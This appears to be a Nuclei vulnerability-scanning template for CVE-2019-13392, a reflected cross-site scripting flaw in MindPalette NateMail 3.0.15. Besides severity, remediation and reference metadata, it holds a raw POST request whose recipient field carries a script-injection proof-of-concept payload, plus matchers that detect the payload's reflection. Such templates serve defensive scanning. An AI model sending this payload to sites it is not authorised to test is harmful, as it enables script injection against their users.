id: CVE-2019-13392

info:
  name: MindPalette NateMail 3.0.15 - Cross-Site Scripting
  author: pikpikcu
  severity: medium
  description: MindPalette NateMail 3.0.15 is susceptible to reflected cross-site scripting which could allows an attacker to execute remote JavaScript in a victim's browser via a specially crafted POST request. The application will reflect the recipient value if it is not in the NateMail recipient array. Note that this array is keyed via integers by default, so any string input will be invalid.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to inject malicious scripts into web pages viewed by users, leading to potential data theft, session hijacking, or defacement of the affected website.
  remediation: |
    Upgrade to the latest version of MindPalette NateMail to fix the XSS vulnerability.
  reference:
    - https://www.doyler.net/security-not-included/natemail-vulnerabilities
    - https://mindpalette.com/tag/natemail/
    - https://nvd.nist.gov/vuln/detail/CVE-2019-13392
    - https://twitter.com/mindpalette
    - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2019-13392
    cwe-id: CWE-79
    epss-score: 0.1071
    epss-percentile: 0.93035
    cpe: cpe:2.3:a:mindpalette:natemail:3.0.15:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: mindpalette
    product: natemail
  tags: cve,cve2019,natemail,xss,mindpalette

http:
  - raw:
      - |
        POST /NateMail.php HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Content-Type: application/x-www-form-urlencoded

        recipient=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '</script><script>alert(document.domain)</script>'

      - type: word
        part: header
        words:
          - text/html
# digest: 490a00463044022043defb6f8c27b75a147b70eb688b6db5ab4f8eda9d99b7f8ea1d15e729e8cda9022035b31c40ce256e4b1d00b1c594fdbd9b4ae045167761f85c97a01668c087ccbc:922c64590222798bb761d5b6d8e72950